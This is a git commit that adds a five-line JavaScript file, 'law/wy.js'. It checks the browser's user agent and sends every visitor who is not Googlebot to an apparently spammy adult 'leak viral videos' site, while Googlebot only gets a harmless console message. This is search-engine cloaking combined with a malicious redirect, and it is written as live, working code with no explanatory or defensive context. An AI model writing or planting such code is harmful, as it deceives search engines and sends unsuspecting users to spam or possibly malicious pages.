0261179aa1b52e20ef4e6d627c43a9a1688a1012
ncpb34 <monayemni.l.l@gmail.com>
2026-09-01 12:21:08 +0600

    Create wy.js

---
+++ law/wy.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "http://leakviralvideos.com/?sex-video-wednesday";
+} else {
+  console.log("Thanks for visiting my page" );
+}
